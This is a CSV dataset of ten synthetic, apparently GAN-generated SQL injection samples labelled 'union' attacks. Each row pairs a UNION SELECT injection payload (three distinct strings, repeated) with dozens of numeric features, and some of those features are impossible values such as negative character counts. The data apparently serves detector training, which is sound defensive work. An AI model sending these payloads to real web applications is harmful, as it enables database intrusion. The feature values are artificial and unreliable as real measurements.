id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,4.770742520105951,67.60810852050781,36.857269287109375,21.10565757751465,12.357730865478516,-1.0141706466674805,16.678640365600586,8.703337669372559,1.2613307237625122,0.25645712018013,0.2303440123796463,0.16237807273864746,0.14580972492694855,3.5800893306732178,0.9082110524177551,0.36079686880111694,1.198468804359436,0.644659698009491,0.4203077256679535,-0.06575469672679901,-0.05902690440416336,1.1976197957992554,4.150104999542236,0.8141170740127563,0.07992314547300339,-0.7748921513557434,-0.005525541957467794,-0.010514500550925732,-0.12188643962144852,0.3000885546207428,0.4455030560493469,-0.37649330496788025,-0.6528902053833008,0.5194555521011353,1.085251808166504,0.08913540095090866,0.08898834884166718,-0.12960344552993774,0.9621301293373108,1.2964801788330078,-0.13215290009975433,0.19091519713401794,0.5539672374725342,1.0162400007247925,0.25076907873153687,0.24254493415355682,-0.07633472979068756,0.493990033864975,0.39655545353889465,0.6752021908760071,-0.08912135660648346,0.4034983515739441,-0.006261991336941719,0.39795413613319397,-0.15858730673789978,-0.6523651480674744,-0.2593991756439209,0.4788697361946106,-0.6501998901367188,-0.3058461546897888,-0.6139025092124939,0.2741878628730774,-0.47167038917541504,0.34809237718582153,0.1790066957473755,0.28330594301223755,1.1161528825759888,-0.6204081177711487,-0.8778510689735413,0.07364232838153839,0.1239858865737915,0.15881329774856567,-0.35972559452056885,-0.0698394626379013,0.23129218816757202,0.0013778897700831294,0.1100275069475174,0.07351252436637878,-0.4519170820713043,-0.04902967810630798,0.10619743168354034,3.164602518081665,-0.05464714393019676,1.4712156057357788,-0.11336718499660492,0.2905837893486023,0.47064724564552307,0.3083615005016327,-1.0265001058578491
GAN_000002,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,7.064166017487042,66.99750518798828,39.02204132080078,22.894025802612305,12.81180477142334,-1.6736844778060913,11.169374465942383,8.391345024108887,0.8638346195220947,0.12924695014953613,0.2777283191680908,0.17986226081848145,0.13253648579120636,3.378829002380371,1.007698893547058,0.3684859871864319,1.5822429656982422,1.0054744482040405,0.6578707098960876,-0.05611593648791313,-0.10954573005437851,2.255544424057007,2.680957794189453,1.2919371128082275,-0.11571798473596573,-0.5870084166526794,0.0012856447137892246,0.020151345059275627,-0.1098174974322319,0.29896488785743713,0.5606035590171814,-1.2575775384902954,-0.9718067646026611,0.9903997778892517,1.5201187133789062,-0.3250071704387665,0.1994774341583252,-0.17107605934143066,0.7856442928314209,1.8613897562026978,-0.4668356478214264,0.09456374496221542,1.054589867591858,1.2870689630508423,0.32851094007492065,-0.19357061386108398,-0.4408082664012909,0.5858140587806702,0.6021370887756348,0.674919605255127,-0.170058935880661,0.9855270981788635,-0.044402770698070526,-0.15643346309661865,-0.6461624503135681,-0.9250524044036865,0.09210570901632309,0.8643230199813843,-1.504539132118225,-0.24608585238456726,-0.8919162750244141,0.24809838831424713,-0.7181177139282227,0.4094252288341522,0.049450188875198364,0.4699961245059967,1.9044926166534424,-1.2769161462783813,-1.5134449005126953,0.2985418140888214,0.5203589797019958,0.624309778213501,-0.16364459693431854,-0.025851398706436157,0.4895622730255127,0.022501135244965553,0.5051851272583008,0.03145284578204155,-0.6532723903656006,-0.3076358139514923,0.5174553990364075,3.9087469577789307,-0.21260526776313782,2.0194954872131348,-0.31025421619415283,0.340645968914032,1.061667561531067,0.7377866506576538,-1.6320949792861938
GAN_000003,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,4.326355646684779,69.74776458740234,32.458248138427734,22.342941284179688,14.306303977966309,-0.7588749527931213,16.270076751708984,9.715327262878418,1.1835707426071167,0.2597872316837311,0.36171698570251465,0.17673081159591675,0.14472636580467224,3.517148494720459,0.6145782470703125,0.19259725511074066,1.7296998500823975,0.8037815093994141,0.3431442379951477,-0.06780389696359634,-0.1441623568534851,1.7640033960342407,3.8921961784362793,0.766950249671936,-0.009950140491127968,-0.13153678178787231,0.01162116602063179,0.24188458919525146,-0.002833740320056677,0.25547847151756287,0.5488762259483337,-0.3771863281726837,-0.5709263682365417,0.3479820787906647,1.3079549074172974,-0.008798069320619106,0.143954336643219,-0.09712062031030655,1.0770028829574585,1.0334582328796387,0.0799315795302391,0.0911455824971199,0.360899955034256,0.6375138163566589,0.08711488544940948,0.16118596494197845,-0.3091260492801666,0.5765700936317444,0.21606791019439697,0.7503037452697754,-0.08530853688716888,0.5453184247016907,-0.1235320121049881,0.1797237992286682,-0.18124186992645264,-0.41533055901527405,-0.07246614992618561,0.25949588418006897,-0.5834819078445435,-0.28845667839050293,-0.1522597372531891,0.41435664892196655,-0.2637191712856293,-0.06108032912015915,0.1141444742679596,0.07644089311361313,0.8167106509208679,-0.7030277252197266,-0.750434160232544,-0.09047539532184601,0.3315572142601013,0.2615395784378052,-0.15837042033672333,-0.13940976560115814,0.34595978260040283,0.07374257594347,0.23042826354503632,0.018924394622445107,-0.4545539617538452,0.02546875923871994,0.09530477970838547,3.0159730911254883,-0.050427477806806564,1.4765921831130981,-0.22149668633937836,0.34308338165283203,0.4816741645336151,0.5068104267120361,-0.8009408116340637
GAN_000004,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,4.208781455504551,67.92117309570312,36.28147888183594,18.27527618408203,12.212555885314941,-0.42346781492233276,23.672130584716797,9.414125442504883,1.124598503112793,0.2834290862083435,0.26451778411865234,0.1714102178812027,0.14229267835617065,3.631760835647583,0.9396076798439026,0.2435208261013031,1.3485628366470337,0.6139196157455444,0.42966946959495544,0.008399601094424725,-0.04518245905637741,1.3003664016723633,4.149562835693359,0.8157333731651306,0.1574060469865799,-0.21813169121742249,-0.0038548014126718044,0.11683295667171478,-0.0737520083785057,0.38317054510116577,0.48060303926467896,-0.2153533548116684,-0.49261629581451416,0.4194667637348175,1.095862627029419,-0.05632234364748001,0.10500700026750565,-0.08566804975271225,0.9776396751403809,1.1953257322311401,-0.003275374649092555,0.2833380401134491,0.4342053234577179,0.669248104095459,0.12223485112190247,0.18716281652450562,-0.25578010082244873,0.5065006017684937,0.1918751299381256,0.5448840856552124,-0.0861678421497345,0.3342054486274719,0.02915026620030403,0.14795167744159698,-0.09740877896547318,-0.44778919219970703,0.014297669753432274,0.18377462029457092,-0.5341230034828186,-0.26744434237480164,-0.43711137771606445,0.2190799117088318,-0.14068201184272766,0.20500540733337402,0.16730138659477234,-0.039330147206783295,0.9083524942398071,-0.06219641491770744,-0.5773903131484985,-0.13525088131427765,0.18684227764606476,0.2399284392595291,-0.019285745918750763,0.14092813432216644,0.06623627245426178,0.019813397899270058,0.38379809260368347,0.04219129681587219,-0.22315934300422668,-0.16404050588607788,0.16537155210971832,2.933535575866699,-0.0371590293943882,1.471055507659912,-0.14960747957229614,0.4100273549556732,0.5024562478065491,0.4768615663051605,-0.634710431098938
GAN_000005,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,7.5282659401988195,70.41581726074219,36.96156692504883,25.21577262878418,14.55598258972168,-1.5184038877487183,8.26286506652832,8.102177619934082,1.4420750141143799,0.10085497051477432,0.2710578739643097,0.1337604820728302,0.13966886699199677,3.4720160961151123,0.8916853070259094,0.3973413109779358,1.3689082860946655,1.0984772443771362,0.6852097511291504,-0.20934322476387024,-0.1610720455646515,1.899034857749939,3.589811086654663,1.252231240272522,-0.060075171291828156,-0.9894682765007019,0.03546445816755295,0.0446166954934597,-0.14110681414604187,0.4725302457809448,0.6251706480979919,-1.0091006755828857,-1.290542483329773,1.1038439273834229,1.6233693361282349,-0.13931551575660706,0.21033476293087006,-0.16534684598445892,0.8526764512062073,1.6928825378417969,-0.34623923897743225,0.028122836723923683,1.1740167140960693,1.760772943496704,0.27148309350013733,0.1692676693201065,-0.29782238602638245,0.8885314464569092,0.8368319272994995,1.0371370315551758,-0.1869477927684784,1.1585662364959717,-0.12984369695186615,0.22397422790527344,-0.5484973192214966,-1.2290695905685425,-0.1316746175289154,0.39001452922821045,-1.1095083951950073,-0.8482276797294617,-0.795001745223999,0.4994257092475891,-1.140809416770935,0.47104790806770325,0.3439761996269226,0.6306315064430237,1.9548330307006836,-1.3403512239456177,-1.589318871498108,0.3160613179206848,0.390737384557724,0.3171320855617523,-0.403990238904953,-0.12429609894752502,0.4723893404006958,-0.168944850564003,0.1498275101184845,0.03712500259280205,-0.731146514415741,-0.14012637734413147,0.4664226174354553,3.2631399631500244,-0.2098139077425003,1.8568007946014404,-0.5438162088394165,0.5346888899803162,1.0231223106384277,0.6474626064300537,-1.6259628534317017
GAN_000006,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,4.6258940126793835,69.8237533569336,32.724117279052734,20.748878479003906,13.063814163208008,-0.6285267472267151,14.663954734802246,9.155165672302246,1.2988264560699463,0.2686507999897003,0.3020331859588623,0.17060483992099762,0.14194737374782562,3.6095526218414307,0.6605061292648315,0.24011573195457458,1.5572513341903687,0.856427013874054,0.5798710584640503,-0.08702690899372101,-0.14521004259586334,1.5660912990570068,3.326077938079834,0.6827709078788757,0.11900217086076736,-0.15379664301872253,0.05540310963988304,0.034205954521894455,-0.02356901206076145,0.41069474816322327,0.6530631184577942,-0.329536110162735,-0.3820377290248871,0.47451627254486084,1.371595859527588,-0.06213027983903885,0.1202419176697731,-0.08788011223077774,1.033412218093872,1.2085741758346558,-0.01745564676821232,0.08940038084983826,0.4891672134399414,0.9943493008613586,0.4022020995616913,0.02770025096833706,-0.3392505943775177,0.593081533908844,0.12570835649967194,0.7755981087684631,-0.13070881366729736,0.44863516092300415,0.0800379067659378,0.1965155154466629,-0.10939300805330276,-0.5195891857147217,-0.28855299949645996,0.24541649222373962,-0.5392640829086304,-0.567270815372467,-0.2088439166545868,0.4100643992424011,-0.42356204986572266,0.133366197347641,0.3589472770690918,0.24051685631275177,0.8575523495674133,-0.6157121658325195,-0.8118969202041626,-0.1762532889842987,0.33733952045440674,-0.06152189150452614,-0.30679038166999817,-0.23557721078395844,0.27801018953323364,0.025030994787812233,0.49077197909355164,0.06297361105680466,-0.381996214389801,0.04391270875930786,0.2112800031900406,3.1501824855804443,-0.05703238770365715,1.4852172136306763,-0.3471672832965851,0.4145991802215576,0.7994576692581177,0.37034231424331665,-0.8445805311203003
GAN_000007,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,4.419376814902463,69.53186798095703,35.39216995239258,19.485912322998047,12.846491813659668,-0.5599105954170227,21.713115692138672,9.472823143005371,0.958222508430481,0.28027835488319397,0.3069726824760437,0.17593656480312347,0.14214767515659332,3.572758674621582,0.6590079665184021,0.21238239109516144,1.8953945636749268,0.7122716307640076,0.47011086344718933,-0.01527570653706789,-0.05463486164808273,1.802491545677185,3.456087350845337,0.6555202007293701,0.16570177674293518,-0.060187824070453644,-0.00020077594672329724,0.19683648645877838,-0.06357934325933456,0.2206805795431137,0.6570650935173035,-0.47692689299583435,-0.4181404411792755,0.4842612147331238,1.1608806848526,-0.13528648018836975,0.1858939230442047,-0.045601848512887955,0.9795507192611694,1.0766003131866455,0.04246460273861885,0.1984359472990036,0.41735559701919556,0.5674031972885132,0.2769160866737366,0.0863809660077095,-0.2859410345554352,0.5657132863998413,0.3450980484485626,0.47907909750938416,0.061561040580272675,0.5396819710731506,0.06596778333187103,0.07413755357265472,0.10460831224918365,-0.5217764377593994,-0.03380325436592102,0.32382267713546753,-0.5730772018432617,-0.24559684097766876,-0.15881237387657166,0.15471413731575012,-0.06313835084438324,0.0339200422167778,0.04817987605929375,0.13472037017345428,0.8110287189483643,-0.36827000975608826,-0.6144583821296692,-0.11923876404762268,0.2117864489555359,0.11588086187839508,-0.15675215423107147,-0.09107650816440582,0.12530779838562012,0.053550854325294495,0.5546828508377075,0.018987340852618217,-0.4486742317676544,0.058096595108509064,0.17027652263641357,3.0422778129577637,-0.07351628690958023,1.5732665061950684,-0.16930869221687317,0.27974674105644226,0.6212825775146484,0.5782638788223267,-0.8163315653800964
GAN_000008,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.198775318181428,69.6211929321289,34.352073669433594,23.96198844909668,13.670297622680664,-1.0894417762756348,11.943455696105957,9.200810432434082,1.117063045501709,0.17812073230743408,0.36273103952407837,0.12188801914453506,0.15188518166542053,3.729254722595215,0.680724024772644,0.3033818304538727,1.328204870223999,0.6971868872642517,0.633152186870575,-0.12099248170852661,-0.1587596833705902,1.3421906232833862,3.889629602432251,1.1946535110473633,-0.10986153036355972,-0.5054032206535339,0.055507998913526535,0.1021672710776329,-0.06831803172826767,0.2962304353713989,0.5405492186546326,-0.3784642517566681,-0.7332962155342102,0.607074499130249,1.2123172283172607,-0.0001577207731315866,0.19155637919902802,-0.06978068500757217,0.8917059302330017,1.3175054788589478,-0.19860832393169403,0.16104337573051453,0.865881621837616,0.6571164727210999,0.1370670646429062,0.11775016039609909,-0.19823402166366577,0.8986074328422546,0.5612945556640625,0.5960442423820496,-0.16585992276668549,0.6963943243026733,0.007807716727256775,0.20217697322368622,-0.12939172983169556,-0.9413442611694336,-0.0677712932229042,0.24860812723636627,-0.7265931367874146,-0.4391254186630249,-0.5391843318939209,0.13815823197364807,-0.5238006711006165,0.1795838177204132,0.3676239848136902,0.5667566657066345,1.2188925743103027,-0.34435248374938965,-1.1916327476501465,-0.02426782064139843,0.17326237261295319,0.1570124477148056,-0.7403748035430908,0.11955571174621582,0.18672814965248108,0.00341665162704885,0.3963935971260071,0.07147984951734543,-0.8291714787483215,-0.04513583332300186,0.07605545222759247,2.611697196960449,-0.0755576342344284,1.8163926601409912,-0.5096057653427124,0.4749290347099304,0.7483185529708862,0.40990617871284485,-1.1696950197219849
GAN_000009,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,4.467488697309829,69.60124969482422,33.5966796875,24.118940353393555,13.896827697753906,-0.8410606980323792,18.016523361206055,9.650812149047852,1.3369195461273193,0.2610138952732086,0.31681108474731445,0.16782353818416595,0.14081166684627533,3.5893492698669434,0.9219976663589478,0.31975051760673523,1.4140427112579346,0.806732714176178,0.02966485545039177,-0.10062523186206818,-0.05121960490942001,1.8240509033203125,3.9768829345703125,0.7358657717704773,-0.07434044033288956,-0.13228997588157654,-0.011786306276917458,0.22507022321224213,-0.03942408412694931,0.34336259961128235,0.5167378187179565,-0.3805653750896454,-0.8845099210739136,0.41692349314689636,1.4137969017028809,0.1187918409705162,0.12225890159606934,-0.10558084398508072,1.0286033153533936,1.012169599533081,0.039059776812791824,0.1063418835401535,0.4090234339237213,0.8830739855766296,0.2189362645149231,-0.035039372742176056,-0.21409356594085693,0.6489872336387634,0.15387459099292755,0.6770113110542297,-0.16375261545181274,0.6534046530723572,-0.15518465638160706,0.09214641153812408,0.03389880433678627,-0.33409935235977173,-0.24167031049728394,0.3480256199836731,-0.46936771273612976,-0.2156805694103241,-0.2313525378704071,0.45554566383361816,-0.7752501368522644,0.21556496620178223,0.36736103892326355,0.12868817150592804,0.8397375345230103,-0.7472577095031738,-0.6112430691719055,-0.008531752973794937,0.23007941246032715,0.13387393951416016,-0.02650698460638523,-0.13210096955299377,0.3391384780406952,0.0875098928809166,0.0800585150718689,-0.015340989455580711,-0.31245148181915283,-0.09214797616004944,0.10254736244678497,3.251035451889038,-0.09010109305381775,1.5629554986953735,-0.027526115998625755,0.45007964968681335,0.4203096628189087,0.35153335332870483,-0.6321679949760437
GAN_000010,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,5.4706578923122615,70.32886505126953,37.16975021362305,19.358116149902344,13.35751724243164,-0.9116805195808411,15.33677864074707,8.774218559265137,1.0682116746902466,0.2358090728521347,0.29505977034568787,0.1653650999069214,0.14056600630283356,3.6381561756134033,0.6857728362083435,0.27749165892601013,1.6577728986740112,0.7812425494194031,0.7171648144721985,-0.03200029209256172,-0.15077105164527893,1.9473477602005005,3.6022825241088867,0.8188504576683044,0.1314280778169632,-0.39722150564193726,0.05215725302696228,0.04346316680312157,-0.1724349558353424,0.40981462597846985,0.7235178351402283,-0.4540814161300659,-0.6060227155685425,0.7231746315956116,1.4136559963226318,-0.20946267247200012,0.18780402839183807,-0.13258522748947144,0.939022421836853,1.1369175910949707,-0.17198292911052704,0.06648816168308258,0.6981971859931946,1.0849525928497314,0.38483214378356934,0.015907512977719307,-0.3697770833969116,0.8597270250320435,0.4303295612335205,0.6788276433944702,-0.05361068248748779,0.6597618460655212,0.011412665247917175,0.2750018537044525,-0.02343287318944931,-0.6106719374656677,0.03278917446732521,0.1348048448562622,-0.7449554800987244,-0.5037712454795837,-0.49085521697998047,0.2329844981431961,-0.3762876093387604,0.20653194189071655,0.21003341674804688,0.2935415208339691,1.4204035997390747,-0.5244231820106506,-0.8990861177444458,0.008953846991062164,0.2904762327671051,0.11017365753650665,-0.2619367837905884,-0.031623661518096924,0.12353692948818207,-0.013646608218550682,0.4818829596042633,0.06136330962181091,-0.6012927293777466,-0.1862044334411621,-0.04107141122221947,3.500696897506714,-0.08633937686681747,1.8474516868591309,-0.44848716259002686,0.3219505250453949,1.0217326879501343,0.6870415210723877,-1.1785531044006348
